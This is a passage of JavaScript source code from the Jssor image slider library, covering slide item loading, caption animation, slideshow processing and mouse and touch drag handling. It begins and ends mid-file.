            var _PlayerInstanceElement;
            var _PlayerInstance;

            var _SequenceNumber;    //for debug only

            $JssorAnimator$.call(_SelfSlideItem, -_DisplayPieces, _DisplayPieces + 1, { $SlideItemAnimator: true });

            function ResetCaptionSlider(fresh) {
                _CaptionSliderOut && _CaptionSliderOut.$Revert();
                _CaptionSliderIn && _CaptionSliderIn.$Revert();

                RefreshContent(slideElmt, fresh);
                _ContentRefreshed = true;

                _CaptionSliderIn = new _CaptionSliderOptions.$Class(slideElmt, _CaptionSliderOptions, 1);
                $JssorDebug$.$LiveStamp(_CaptionSliderIn, "caption_slider_" + _CaptionSliderCount + "_in");
                _CaptionSliderOut = new _CaptionSliderOptions.$Class(slideElmt, _CaptionSliderOptions);
                $JssorDebug$.$LiveStamp(_CaptionSliderOut, "caption_slider_" + _CaptionSliderCount + "_out");

                $JssorDebug$.$Execute(function () {
                    _CaptionSliderCount++;
                });

                _CaptionSliderOut.$GoToBegin();
                _CaptionSliderIn.$GoToBegin();
            }

            function EnsureCaptionSliderVersion() {
                if (_CaptionSliderIn.$Version < _CaptionSliderOptions.$Version) {
                    ResetCaptionSlider();
                }
            }

            //event handling begin
            function LoadImageCompleteEventHandler(completeCallback, loadingScreen, image) {
                if (!_ImageLoaded) {
                    _ImageLoaded = true;

                    if (_ImageItem && image) {
                        var imageWidth = image.width;
                        var imageHeight = image.height;
                        var fillWidth = imageWidth;
                        var fillHeight = imageHeight;

                        if (imageWidth && imageHeight && _Options.$FillMode) {

                            //0 stretch, 1 contain (keep aspect ratio and put all inside slide), 2 cover (keep aspect ratio and cover whole slide), 4 actual size, 5 contain for large image, actual size for small image, default value is 0
                            if (_Options.$FillMode & 3 && (!(_Options.$FillMode & 4) || imageWidth > _SlideWidth || imageHeight > _SlideHeight)) {
                                var fitHeight = false;
                                var ratio = _SlideWidth / _SlideHeight * imageHeight / imageWidth;

                                if (_Options.$FillMode & 1) {
                                    fitHeight = (ratio > 1);
                                }
                                else if (_Options.$FillMode & 2) {
                                    fitHeight = (ratio < 1);
                                }
                                fillWidth = fitHeight ? imageWidth * _SlideHeight / imageHeight : _SlideWidth;
                                fillHeight = fitHeight ? _SlideHeight : imageHeight * _SlideWidth / imageWidth;
                            }

                            $Jssor$.$CssWidth(_ImageItem, fillWidth);
                            $Jssor$.$CssHeight(_ImageItem, fillHeight);
                            $Jssor$.$CssTop(_ImageItem, (_SlideHeight - fillHeight) / 2);
                            $Jssor$.$CssLeft(_ImageItem, (_SlideWidth - fillWidth) / 2);
                        }

                        $Jssor$.$CssPosition(_ImageItem, "absolute");

                        _SelfSlider.$TriggerEvent(JssorSlider.$EVT_LOAD_END, slideItem);
                    }
                }

                $Jssor$.$HideElement(loadingScreen);
                completeCallback && completeCallback(_SelfSlideItem);
            }

            function LoadSlideshowImageCompleteEventHandler(nextIndex, nextItem, slideshowTransition, loadingTicket) {
                if (loadingTicket == _LoadingTicket && _CurrentSlideIndex == slideIndex && _AutoPlay) {
                    if (!_Frozen) {
                        var nextRealIndex = GetRealIndex(nextIndex);
                        _SlideshowRunner.$Initialize(nextRealIndex, slideIndex, nextItem, _SelfSlideItem, slideshowTransition);
                        nextItem.$HideContentForSlideshow();
                        _Slideshow.$Locate(nextRealIndex, 1);
                        _Slideshow.$GoToPosition(nextRealIndex);
                        _CarouselPlayer.$PlayCarousel(nextIndex, nextIndex, 0);
                    }
                }
            }

            function SlideReadyEventHandler(loadingTicket) {
                if (loadingTicket == _LoadingTicket && _CurrentSlideIndex == slideIndex) {

                    if (!_Processor) {
                        var slideshowProcessor = null;
                        if (_SlideshowRunner) {
                            if (_SlideshowRunner.$Index == slideIndex)
                                slideshowProcessor = _SlideshowRunner.$GetProcessor();
                            else
                                _SlideshowRunner.$Clear();
                        }

                        EnsureCaptionSliderVersion();

                        _Processor = new Processor(slideElmt, slideIndex, slideshowProcessor, _SelfSlideItem.$GetCaptionSliderIn(), _SelfSlideItem.$GetCaptionSliderOut());
                        _Processor.$SetPlayer(_PlayerInstance);
                    }

                    !_Processor.$IsPlaying() && _Processor.$Replay();
                }
            }

            function ParkEventHandler(currentIndex, previousIndex, manualActivate) {
                if (currentIndex == slideIndex) {

                    if (currentIndex != previousIndex)
                        _SlideItems[previousIndex] && _SlideItems[previousIndex].$ParkOut();
                    else
                        !manualActivate && _Processor && _Processor.$AdjustIdleOnPark();

                    _PlayerInstance && _PlayerInstance.$Enable();

                    //park in
                    var loadingTicket = _LoadingTicket = $Jssor$.$GetNow();
                    _SelfSlideItem.$LoadImage($Jssor$.$CreateCallback(null, SlideReadyEventHandler, loadingTicket));
                }
                else {
                    var distance = Math.abs(slideIndex - currentIndex);
                    var loadRange = _DisplayPieces + _Options.$LazyLoading;
                    if (!_ImageLazyLoading || distance <= loadRange || _SlideCount - distance <= loadRange) {
                        _SelfSlideItem.$LoadImage();
                    }
                }
            }

            function SwipeStartEventHandler() {
                if (_CurrentSlideIndex == slideIndex && _Processor) {
                    _Processor.$Stop();
                    _PlayerInstance && _PlayerInstance.$Quit();
                    _PlayerInstance && _PlayerInstance.$Disable();
                    _Processor.$OpenSlideshowPanel();
                }
            }

            function FreezeEventHandler() {
                if (_CurrentSlideIndex == slideIndex && _Processor) {
                    _Processor.$Stop();
                }
            }

            function LinkClickEventHandler(event) {
                if (_LastDragSucceded) {
                    $Jssor$.$CancelEvent(event);
                }
                else {
                    _SelfSlider.$TriggerEvent(JssorSlider.$EVT_CLICK, slideIndex, event);
                }
            }

            function PlayerAvailableEventHandler() {
                _PlayerInstance = _PlayerInstanceElement.pInstance;
                _Processor && _Processor.$SetPlayer(_PlayerInstance);
            }

            _SelfSlideItem.$LoadImage = function (completeCallback, loadingScreen) {
                loadingScreen = loadingScreen || _LoadingScreen;

                if (_ImageElmts.length && !_ImageLoaded) {

                    $Jssor$.$ShowElement(loadingScreen);

                    if (!_ImageLoading) {
                        _ImageLoading = true;
                        _SelfSlider.$TriggerEvent(JssorSlider.$EVT_LOAD_START);

                        $Jssor$.$Each(_ImageElmts, function (imageElmt) {

                            if (!imageElmt.src) {
                                imageElmt.src = $Jssor$.$AttributeEx(imageElmt, "src2");
                                $Jssor$.$CssDisplay(imageElmt, imageElmt["display-origin"]);
                            }
                        });
                    }
                    $Jssor$.$LoadImages(_ImageElmts, _ImageItem, $Jssor$.$CreateCallback(null, LoadImageCompleteEventHandler, completeCallback, loadingScreen));
                }
                else {
                    LoadImageCompleteEventHandler(completeCallback, loadingScreen);
                }
            };

            _SelfSlideItem.$GoForNextSlide = function () {
                if (_SlideshowRunner) {
                    var slideshowTransition = _SlideshowRunner.$GetTransition(_SlideCount);

                    if (slideshowTransition) {
                        var loadingTicket = _LoadingTicket = $Jssor$.$GetNow();

                        var nextIndex = slideIndex + _PlayReverse;
                        var nextItem = _SlideItems[GetRealIndex(nextIndex)];
                        return nextItem.$LoadImage($Jssor$.$CreateCallback(null, LoadSlideshowImageCompleteEventHandler, nextIndex, nextItem, slideshowTransition, loadingTicket), _LoadingScreen);
                    }
                }

                PlayTo(_CurrentSlideIndex + _Options.$AutoPlaySteps * _PlayReverse);
            };

            _SelfSlideItem.$TryActivate = function () {
                ParkEventHandler(slideIndex, slideIndex, true);
            };

            _SelfSlideItem.$ParkOut = function () {
                //park out
                _PlayerInstance && _PlayerInstance.$Quit();
                _PlayerInstance && _PlayerInstance.$Disable();
                _SelfSlideItem.$UnhideContentForSlideshow();
                _Processor && _Processor.$Abort();
                _Processor = null;
                ResetCaptionSlider();
            };

            //for debug only
            _SelfSlideItem.$StampSlideItemElements = function (stamp) {
                stamp = _SequenceNumber + "_" + stamp;

                $JssorDebug$.$Execute(function () {
                    if (_ImageItem)
                        $Jssor$.$Attribute(_ImageItem, "debug-id", stamp + "_slide_item_image_id");

                    $Jssor$.$Attribute(slideElmt, "debug-id", stamp + "_slide_item_item_id");
                });

                $JssorDebug$.$Execute(function () {
                    $Jssor$.$Attribute(_Wrapper, "debug-id", stamp + "_slide_item_wrapper_id");
                });

                $JssorDebug$.$Execute(function () {
                    $Jssor$.$Attribute(_LoadingScreen, "debug-id", stamp + "_loading_container_id");
                });
            };

            _SelfSlideItem.$HideContentForSlideshow = function () {
                $Jssor$.$HideElement(slideElmt);
            };

            _SelfSlideItem.$UnhideContentForSlideshow = function () {
                $Jssor$.$ShowElement(slideElmt);
            };

            _SelfSlideItem.$EnablePlayer = function () {
                _PlayerInstance && _PlayerInstance.$Enable();
            };

            function RefreshContent(elmt, fresh, level) {
                if (elmt["jssor-slider"])
                    return;

                level = level || 0;

                if (!_ContentRefreshed) {
                    if (elmt.tagName == "IMG") {
                        _ImageElmts.push(elmt);

                        if (!elmt.src) {
                            _ImageLazyLoading = true;
                            elmt["display-origin"] = $Jssor$.$CssDisplay(elmt);
                            $Jssor$.$HideElement(elmt);
                        }
                    }
                    if ($Jssor$.$IsBrowserIe9Earlier()) {
                        $Jssor$.$CssZIndex(elmt, ($Jssor$.$CssZIndex(elmt) || 0) + 1);
                    }
                    if (_Options.$HWA && $Jssor$.$WebKitVersion()) {
                        if (!_IsTouchDevice || $Jssor$.$WebKitVersion() < 534 || (!_SlideshowEnabled && !$Jssor$.$IsBrowserChrome())) {
                            $Jssor$.$EnableHWA(elmt);
                        }
                    }
                }

                var childElements = $Jssor$.$Children(elmt);

                $Jssor$.$Each(childElements, function (childElement, i) {

                    var uAttribute = $Jssor$.$AttributeEx(childElement, "u");
                    if (uAttribute == "player" && !_PlayerInstanceElement) {
                        _PlayerInstanceElement = childElement;
                        if (_PlayerInstanceElement.pInstance) {
                            PlayerAvailableEventHandler();
                        }
                        else {
                            $Jssor$.$AddEvent(_PlayerInstanceElement, "dataavailable", PlayerAvailableEventHandler);
                        }
                    }

                    if (uAttribute == "caption") {
                        if (!$Jssor$.$IsBrowserIE() && !fresh) {
                            var captionElement = $Jssor$.$CloneNode(childElement);
                            $Jssor$.$InsertBefore(elmt, captionElement, childElement);
                            $Jssor$.$RemoveChild(elmt, childElement);
                            childElement = captionElement;

                            fresh = true;
                        }
                    }
                    else if (!_ContentRefreshed && !level && !_ImageItem && $Jssor$.$AttributeEx(childElement, "u") == "image") {
                        _ImageItem = childElement;

                        if (_ImageItem) {
                            if (_ImageItem.tagName == "A") {
                                _LinkItemOrigin = _ImageItem;
                                $Jssor$.$SetStyles(_LinkItemOrigin, _StyleDef);

                                _LinkItem = $Jssor$.$CloneNode(_ImageItem, true);
                                //cancel click event on <A> element when a drag of slide succeeded
                                $Jssor$.$AddEvent(_LinkItem, "click", LinkClickEventHandler);

                                $Jssor$.$SetStyles(_LinkItem, _StyleDef);
                                $Jssor$.$CssDisplay(_LinkItem, "block");
                                $Jssor$.$CssOpacity(_LinkItem, 0);
                                $Jssor$.$Css(_LinkItem, "backgroundColor", "#000");

                                _ImageItem = $Jssor$.$FindChildByTag(_ImageItem, "IMG");

                                $JssorDebug$.$Execute(function () {
                                    if (!_ImageItem) {
                                        $JssorDebug$.$Error("slide html code definition error, no 'IMG' found in a 'image with link' slide.\r\n" + elmt.outerHTML);
                                    }
                                });
                            }
                            _ImageItem.border = 0;

                            $Jssor$.$SetStyles(_ImageItem, _StyleDef);
                        }
                    }

                    RefreshContent(childElement, fresh, level + 1);
                });
            }

            _SelfSlideItem.$OnInnerOffsetChange = function (oldOffset, newOffset) {
                var slidePosition = _DisplayPieces - newOffset;

                SetPosition(_Wrapper, slidePosition);

                //following lines are for future usage, not ready yet
                //if (!_IsDragging || !_IsCaptionSliderPlayingWhenDragStart) {
                //    var _DealWithParallax;
                //    if (IsCurrentSlideIndex(slideIndex)) {
                //        if (_CaptionSliderOptions.$PlayOutMode == 2)
                //            _DealWithParallax = true;
                //    }
                //    else {
                //        if (!_CaptionSliderOptions.$PlayInMode) {
                //            //PlayInMode: 0 none
                //            _CaptionSliderIn.$GoToEnd();
                //        }
                //        //else if (_CaptionSliderOptions.$PlayInMode == 1) {
                //        //    //PlayInMode: 1 chain
                //        //    _CaptionSliderIn.$GoToBegin();
                //        //}
                //        else if (_CaptionSliderOptions.$PlayInMode == 2) {
                //            //PlayInMode: 2 parallel
                //            _DealWithParallax = true;
                //        }
                //    }

                //    if (_DealWithParallax) {
                //        _CaptionSliderIn.$GoToPosition((_CaptionSliderIn.$GetPosition_OuterEnd() - _CaptionSliderIn.$GetPosition_OuterBegin()) * Math.abs(newOffset - 1) * .8 + _CaptionSliderIn.$GetPosition_OuterBegin());
                //    }
                //}
            };

            _SelfSlideItem.$GetCaptionSliderIn = function () {
                return _CaptionSliderIn;
            };

            _SelfSlideItem.$GetCaptionSliderOut = function () {
                return _CaptionSliderOut;
            };

            _SelfSlideItem.$Index = slideIndex;

            $JssorObject$.call(_SelfSlideItem);

            //SlideItem Constructor
            {

                var thumb = $Jssor$.$FindChild(slideElmt, "thumb", true);
                if (thumb) {
                    _SelfSlideItem.$Thumb = $Jssor$.$CloneNode(thumb);
                    $Jssor$.$RemoveAttribute(thumb, "id");
                    $Jssor$.$HideElement(thumb);
                }
                $Jssor$.$ShowElement(slideElmt);

                _LoadingScreen = $Jssor$.$CloneNode(_LoadingContainer);
                $Jssor$.$CssZIndex(_LoadingScreen, 1000);

                //cancel click event on <A> element when a drag of slide succeeded
                $Jssor$.$AddEvent(slideElmt, "click", LinkClickEventHandler);

                ResetCaptionSlider(true);

                _SelfSlideItem.$Image = _ImageItem;
                _SelfSlideItem.$Link = _LinkItem;

                _SelfSlideItem.$Item = slideElmt;

                _SelfSlideItem.$Wrapper = _Wrapper = slideElmt;
                $Jssor$.$AppendChild(_Wrapper, _LoadingScreen);

                _SelfSlider.$On(203, ParkEventHandler);
                _SelfSlider.$On(28, FreezeEventHandler);
                _SelfSlider.$On(24, SwipeStartEventHandler);

                $JssorDebug$.$Execute(function () {
                    _SequenceNumber = _SlideItemCreatedCount++;
                });

                $JssorDebug$.$Execute(function () {
                    $Jssor$.$Attribute(_Wrapper, "debug-id", "slide-" + slideIndex);
                });
            }
        }
        //SlideItem

        //Processor
        function Processor(slideElmt, slideIndex, slideshowProcessor, captionSliderIn, captionSliderOut) {

            var _SelfProcessor = this;

            var _ProgressBegin = 0;
            var _SlideshowBegin = 0;
            var _SlideshowEnd;
            var _CaptionInBegin;
            var _IdleBegin;
            var _IdleEnd;
            var _ProgressEnd;

            var _IsSlideshowRunning;
            var _IsRollingBack;

            var _PlayerInstance;
            var _IsPlayerOnService;

            var slideItem = _SlideItems[slideIndex];

            $JssorAnimator$.call(_SelfProcessor, 0, 0);

            function UpdateLink() {

                $Jssor$.$ClearChildren(_LinkContainer);

                if (_ShowLink && _IsSlideshowRunning && slideItem.$Link) {
                    $Jssor$.$AppendChild(_LinkContainer, slideItem.$Link);
                }

                $Jssor$.$ShowElement(_LinkContainer, !_IsSlideshowRunning && slideItem.$Image);
            }

            function ProcessCompleteEventHandler() {

                if (_IsRollingBack) {
                    _IsRollingBack = false;
                    _SelfSlider.$TriggerEvent(JssorSlider.$EVT_ROLLBACK_END, slideIndex, _IdleEnd, _ProgressBegin, _IdleBegin, _IdleEnd, _ProgressEnd);
                    _SelfProcessor.$GoToPosition(_IdleBegin);
                }

                _SelfProcessor.$Replay();
            }

            function PlayerSwitchEventHandler(isOnService) {
                _IsPlayerOnService = isOnService;

                _SelfProcessor.$Stop();
                _SelfProcessor.$Replay();
            }

            _SelfProcessor.$Replay = function () {

                var currentPosition = _SelfProcessor.$GetPosition_Display();

                if (!_IsDragging && !_IsSliding && !_IsPlayerOnService && _CurrentSlideIndex == slideIndex) {

                    if (!currentPosition) {
                        if (_SlideshowEnd && !_IsSlideshowRunning) {
                            _IsSlideshowRunning = true;

                            _SelfProcessor.$OpenSlideshowPanel(true);

                            _SelfSlider.$TriggerEvent(JssorSlider.$EVT_SLIDESHOW_START, slideIndex, _ProgressBegin, _SlideshowBegin, _SlideshowEnd, _ProgressEnd);
                        }

                        UpdateLink();
                    }

                    var toPosition;
                    var stateEvent = JssorSlider.$EVT_STATE_CHANGE;

                    if (currentPosition != _ProgressEnd) {
                        if (currentPosition == _IdleEnd) {
                            toPosition = _ProgressEnd;
                        }
                        else if (currentPosition == _IdleBegin) {
                            toPosition = _IdleEnd;
                        }
                        else if (!currentPosition) {
                            toPosition = _IdleBegin;
                        }
                        else if (currentPosition > _IdleEnd) {
                            _IsRollingBack = true;
                            toPosition = _IdleEnd;
                            stateEvent = JssorSlider.$EVT_ROLLBACK_START;
                        }
                        else {
                            //continue from break (by drag or lock)
                            toPosition = _SelfProcessor.$GetPlayToPosition();
                        }
                    }

                    //$JssorDebug$.$Execute(function () {
                    //    if (currentPosition == _ProgressEnd) {
                    //        debugger;
                    //    }
                    //});

                    _SelfSlider.$TriggerEvent(stateEvent, slideIndex, currentPosition, _ProgressBegin, _IdleBegin, _IdleEnd, _ProgressEnd);

                    var allowAutoPlay = _AutoPlay && (!_HoverToPause || _NotOnHover);

                    if (currentPosition == _ProgressEnd) {
                        (_IdleEnd != _ProgressEnd && !(_HoverToPause & 12) || allowAutoPlay) && slideItem.$GoForNextSlide();
                    }
                    else if (allowAutoPlay || currentPosition != _IdleEnd) {
                        _SelfProcessor.$PlayToPosition(toPosition, ProcessCompleteEventHandler);
                    }
                }
            };

            _SelfProcessor.$AdjustIdleOnPark = function () {
                if (_IdleEnd == _ProgressEnd && _IdleEnd == _SelfProcessor.$GetPosition_Display())
                    _SelfProcessor.$GoToPosition(_IdleBegin);
            };

            _SelfProcessor.$Abort = function () {
                _SlideshowRunner && _SlideshowRunner.$Index == slideIndex && _SlideshowRunner.$Clear();

                var currentPosition = _SelfProcessor.$GetPosition_Display();
                if (currentPosition < _ProgressEnd) {
                    _SelfSlider.$TriggerEvent(JssorSlider.$EVT_STATE_CHANGE, slideIndex, -currentPosition -1, _ProgressBegin, _IdleBegin, _IdleEnd, _ProgressEnd);
                }
            };

            _SelfProcessor.$OpenSlideshowPanel = function (open) {
                if (slideshowProcessor) {
                    $Jssor$.$CssOverflow(_SlideshowPanel, open && slideshowProcessor.$Transition.$Outside ? "" : "hidden");
                }
            };

            _SelfProcessor.$OnInnerOffsetChange = function (oldPosition, newPosition) {

                if (_IsSlideshowRunning && newPosition >= _SlideshowEnd) {
                    _IsSlideshowRunning = false;
                    UpdateLink();
                    slideItem.$UnhideContentForSlideshow();
                    _SlideshowRunner.$Clear();

                    _SelfSlider.$TriggerEvent(JssorSlider.$EVT_SLIDESHOW_END, slideIndex, _ProgressBegin, _SlideshowBegin, _SlideshowEnd, _ProgressEnd);
                }

                _SelfSlider.$TriggerEvent(JssorSlider.$EVT_PROGRESS_CHANGE, slideIndex, newPosition, _ProgressBegin, _IdleBegin, _IdleEnd, _ProgressEnd);
            };

            _SelfProcessor.$SetPlayer = function (playerInstance) {
                if (playerInstance && !_PlayerInstance) {
                    _PlayerInstance = playerInstance;

                    playerInstance.$On($JssorPlayer$.$EVT_SWITCH, PlayerSwitchEventHandler);
                }
            };

            //Processor Constructor
            {
                if (slideshowProcessor) {
                    _SelfProcessor.$Chain(slideshowProcessor);
                }

                _SlideshowEnd = _SelfProcessor.$GetPosition_OuterEnd();
                _CaptionInBegin = _SelfProcessor.$GetPosition_OuterEnd();
                _SelfProcessor.$Chain(captionSliderIn);
                _IdleBegin = captionSliderIn.$GetPosition_OuterEnd();
                _IdleEnd = _IdleBegin + ($Jssor$.$ParseFloat($Jssor$.$AttributeEx(slideElmt, "idle")) || _Options.$AutoPlayInterval);

                captionSliderOut.$Shift(_IdleEnd);
                _SelfProcessor.$Combine(captionSliderOut);
                _ProgressEnd = _SelfProcessor.$GetPosition_OuterEnd();
            }
        }
        //Processor
        //private classes

        function SetPosition(elmt, position) {
            var orientation = _DragOrientation > 0 ? _DragOrientation : _PlayOrientation;
            var x = _StepLengthX * position * (orientation & 1);
            var y = _StepLengthY * position * ((orientation >> 1) & 1);

            if ($Jssor$.$IsBrowserChrome() && $Jssor$.$BrowserVersion() < 38) {
                x = x.toFixed(3);
                y = y.toFixed(3);
            }
            else {
                x = Math.round(x);
                y = Math.round(y);
            }

            if ($Jssor$.$IsBrowserIE() && $Jssor$.$BrowserVersion() >= 10 && $Jssor$.$BrowserVersion() < 11) {
                elmt.style.msTransform = "translate(" + x + "px, " + y + "px)";
            }
            else if ($Jssor$.$IsBrowserChrome() && $Jssor$.$BrowserVersion() >= 30 && $Jssor$.$BrowserVersion() < 34) {
                elmt.style.WebkitTransition = "transform 0s";
                elmt.style.WebkitTransform = "translate3d(" + x + "px, " + y + "px, 0px) perspective(2000px)";
            }
            else {
                $Jssor$.$CssLeft(elmt, x);
                $Jssor$.$CssTop(elmt, y);
            }
        }

        //Event handling begin

        function OnMouseDown(event) {
            var tagName = $Jssor$.$EventSrc(event).tagName;
            if (!_DragOrientationRegistered && tagName != "INPUT" && tagName != "TEXTAREA" && tagName != "SELECT" && RegisterDrag()) {
                OnDragStart(event);
            }
        }

        function RecordFreezePoint() {

            _CarouselPlaying_OnFreeze = _IsSliding;
            _PlayToPosition_OnFreeze = _CarouselPlayer.$GetPlayToPosition();
            _Position_OnFreeze = _Conveyor.$GetPosition();

        }

        function Freeze() {

            RecordFreezePoint();

            if (_IsDragging || !_NotOnHover && (_HoverToPause & 12)) {
                _CarouselPlayer.$Stop();

                _SelfSlider.$TriggerEvent(JssorSlider.$EVT_FREEZE);
            }

        }

        function Unfreeze(byDrag) {

            byDrag && RecordFreezePoint();

            if (!_IsDragging && (_NotOnHover || !(_HoverToPause & 12)) && !_CarouselPlayer.$IsPlaying()) {

                var currentPosition = _Conveyor.$GetPosition();
                var toPosition = Math.ceil(_Position_OnFreeze);

                if (byDrag && Math.abs(_DragOffsetTotal) >= _Options.$MinDragOffsetToSlide) {
                    toPosition = Math.ceil(currentPosition);
                    toPosition += _DragIndexAdjust;
                }

                if (!(_Loop & 1)) {
                    toPosition = Math.min(_SlideCount - _DisplayPieces, Math.max(toPosition, 0));
                }

                var t = Math.abs(toPosition - currentPosition);
                t = 1 - Math.pow(1 - t, 5);

                if (!_LastDragSucceded && _CarouselPlaying_OnFreeze) {
                    _CarouselPlayer.$Continue(_PlayToPosition_OnFreeze);
                }
                else if (currentPosition == toPosition) {
                    _CurrentSlideItem.$EnablePlayer();
                    _CurrentSlideItem.$TryActivate();
                }
                else {

                    _CarouselPlayer.$PlayCarousel(currentPosition, toPosition, t * _SlideDuration);
                }
            }
        }

        function OnDragStart(event) {

            _IsDragging = true;
            _DragInvalid = false;
            _LoadingTicket = null;

            $Jssor$.$AddEvent(document, _MoveEvent, OnDragMove);

            _LastTimeMoveByDrag = $Jssor$.$GetNow() - 50;

            _LastDragSucceded = 0;
            Freeze();

            if (!_CarouselPlaying_OnFreeze)
                _DragOrientation = 0;

            if (_HandleTouchEventOnly) {
                var touchPoint = event.touches[0];
                _DragStartMouseX = touchPoint.clientX;
                _DragStartMouseY = touchPoint.clientY;
            }
            else {
                var mousePoint = $Jssor$.$MousePosition(event);

                _DragStartMouseX = mousePoint.x;
                _DragStartMouseY = mousePoint.y;

                $Jssor$.$CancelEvent(event);
            }

            _DragOffsetTotal = 0;
            _DragOffsetLastTime = 0;
            _DragIndexAdjust = 0;

            //Trigger EVT_DRAGSTART
            _SelfSlider.$TriggerEvent(JssorSlider.$EVT_DRAG_START, GetRealIndex(_Position_OnFreeze), _Position_OnFreeze, event);
        }

        function OnDragMove(event) {
            if (_IsDragging && (!$Jssor$.$IsBrowserIe9Earlier() || event.button)) {
                var actionPoint;

                if (_HandleTouchEventOnly) {
                    var touches = event.touches;
                    if (touches && touches.length > 0) {
                        actionPoint = { x: touches[0].clientX, y: touches[0].clientY };
                    }
                }
                else {
                    actionPoint = $Jssor$.$MousePosition(event);
                }

                if (actionPoint) {
                    var distanceX = actionPoint.x - _DragStartMouseX;
                    var distanceY = actionPoint.y - _DragStartMouseY;


                    if (Math.floor(_Position_OnFreeze) != _Position_OnFreeze)
                        _DragOrientation = _DragOrientation || (_PlayOrientation & _DragOrientationRegistered);

                    if ((distanceX || distanceY) && !_DragOrientation) {
                        if (_DragOrientationRegistered == 3) {
                            if (Math.abs(distanceY) > Math.abs(distanceX)) {
                                _DragOrientation = 2;
                            }
                            else
                                _DragOrientation = 1;
                        }
                        else {
                            _DragOrientation = _DragOrientationRegistered;
                        }

                        if (_IsTouchDevice && _DragOrientation == 1 && Math.abs(distanceY) - Math.abs(distanceX) > 3) {
                            _DragInvalid = true;
                        }
                    }

                    if (_DragOrientation) {
                        var distance = distanceY;
                        var stepLength = _StepLengthY;

                        if (_DragOrientation == 1) {
                            distance = distanceX;
                            stepLength = _StepLengthX;
                        }

                        if (!(_Loop & 1)) {
                            if (distance > 0) {
                                var normalDistance = stepLength * _CurrentSlideIndex;
                                var sqrtDistance = distance - normalDistance;
                                if (sqrtDistance > 0) {
                                    distance = normalDistance + Math.sqrt(sqrtDistance) * 5;
                                }
                            }

                            if (distance < 0) {
                                var normalDistance = stepLength * (_SlideCount - _DisplayPieces - _CurrentSlideIndex);
                                var sqrtDistance = -distance - normalDistance;

                                if (sqrtDistance > 0) {
                                    distance = -normalDistance - Math.sqrt(sqrtDistance) * 5;
                                }
                            }
                        }

                        if (_DragOffsetTotal - _DragOffsetLastTime < -2) {
                            _DragIndexAdjust = 0;
                        }
                        else if (_DragOffsetTotal - _DragOffsetLastTime > 2) {
                            _DragIndexAdjust = -1;
                        }

                        _DragOffsetLastTime = _DragOffsetTotal;
                        _DragOffsetTotal = distance;
                        _PositionToGoByDrag = _Position_OnFreeze - _DragOffsetTotal / stepLength / (_ScaleRatio || 1);

                        if (_DragOffsetTotal && _DragOrientation && !_DragInvalid) {
                            $Jssor$.$CancelEvent(event);
                            if (!_IsSliding) {
                                _CarouselPlayer.$StandBy(_PositionToGoByDrag);
                            }
                            else
                                _CarouselPlayer.$SetStandByPosition(_PositionToGoByDrag);
                        }
                        else if ($Jssor$.$IsBrowserIe9Earlier()) {
                            $Jssor$.$CancelEvent(event);
                        }
                    }
                }
            }
            else {
                OnDragEnd(event);
            }
        }

        function OnDragEnd(event) {
            UnregisterDrag();

            if (_IsDragging) {

                _IsDragging = false;

                _LastTimeMoveByDrag = $Jssor$.$GetNow();

                $Jssor$.$RemoveEvent(document, _MoveEvent, OnDragMove);

                _LastDragSucceded = _DragOffsetTotal;

                _LastDragSucceded && $Jssor$.$CancelEvent(event);

                _CarouselPlayer.$Stop();

                var currentPosition = _Conveyor.$GetPosition();

                //Trigger EVT_DRAG_END
                _SelfSlider.$TriggerEvent(JssorSlider.$EVT_DRAG_END, GetRealIndex(currentPosition), currentPosition, GetRealIndex(_Position_OnFreeze), _Position_OnFreeze, event);

                Unfreeze(true);
            }
        }
        //Event handling end

        function SetCurrentSlideIndex(index) {
            _PrevSlideItem = _SlideItems[_CurrentSlideIndex];
            _PreviousSlideIndex = _CurrentSlideIndex;
            _CurrentSlideIndex = GetRealIndex(index);
            _CurrentSlideItem = _SlideItems[_CurrentSlideIndex];
            ResetNavigator(index);
            return _CurrentSlideIndex;
        }

        function OnPark(slideIndex, prevIndex) {
            _DragOrientation = 0;

            SetCurrentSlideIndex(slideIndex);

            //Trigger EVT_PARK
            _SelfSlider.$TriggerEvent(JssorSlider.$EVT_PARK, GetRealIndex(slideIndex), prevIndex);
        }

        function ResetNavigator(index, temp) {
            _TempSlideIndex = index;
            $Jssor$.$Each(_Navigators, function (navigator) {
                navigator.$SetCurrentIndex(GetRealIndex(index), index, temp);
            });
        }

        function RegisterDrag() {
            var dragRegistry = JssorSlider.$DragRegistry || 0;
            var dragOrientation = _DragEnabled;
            if (_IsTouchDevice)
                (dragOrientation & 1) && (dragOrientation &= 1);
            JssorSlider.$DragRegistry |= dragOrientation;

            return (_DragOrientationRegistered = dragOrientation & ~dragRegistry);
        }

        function UnregisterDrag() {
            if (_DragOrientationRegistered) {
                JssorSlider.$DragRegistry &= ~_DragEnabled;
                _DragOrientationRegistered = 0;
            }
        }

        function CreatePanel() {
            var div = $Jssor$.$CreateDiv();

            $Jssor$.$SetStyles(div, _StyleDef);
            $Jssor$.$CssPosition(div, "absolute");

            return div;
        }

        function GetRealIndex(index) {
            return (index % _SlideCount + _SlideCount) % _SlideCount;
        }

        function IsCurrentSlideIndex(index) {
            return GetRealIndex(index) == _CurrentSlideIndex;
        }

        function IsPreviousSlideIndex(index) {
            return GetRealIndex(index) == _PreviousSlideIndex;
        }

        //Navigation Request Handler
        function NavigationClickHandler(index, relative) {
            if (relative) {
                if (!_Loop) {
                    //Stop at threshold
                    index = Math.min(Math.max(index + _TempSlideIndex, 0), _SlideCount - _DisplayPieces);
                    relative = false;
                }
                else if (_Loop & 2) {
                    //Rewind
                    index = GetRealIndex(index + _TempSlideIndex);
                    relative = false;
                }
            }
            PlayTo(index, _Options.$SlideDuration, relative);
        }

        function ShowNavigators() {
            $Jssor$.$Each(_Navigators, function (navigator) {
                navigator.$Show(navigator.$Options.$ChanceToShow <= _NotOnHover);
            });
        }

        function MainContainerMouseLeaveEventHandler() {
            if (!_NotOnHover) {

                //$JssorDebug$.$Log("mouseleave");

                _NotOnHover = 1;

                ShowNavigators();

                if (!_IsDragging) {
                    (_HoverToPause & 12) && Unfreeze();
                    (_HoverToPause & 3) && _SlideItems[_CurrentSlideIndex].$TryActivate();
                }
            }
        }

        function MainContainerMouseEnterEventHandler() {

            if (_NotOnHover) {

                //$JssorDebug$.$Log("mouseenter");

                _NotOnHover = 0;

                ShowNavigators();

                _IsDragging || !(_HoverToPause & 12) || Freeze();
            }
        }

        function AdjustSlidesContainerSize() {
            _StyleDef = { $Width: _SlideWidth, $Height: _SlideHeight, $Top: 0, $Left: 0 };

            $Jssor$.$Each(_SlideElmts, function (slideElmt, i) {

                $Jssor$.$SetStyles(slideElmt, _StyleDef);
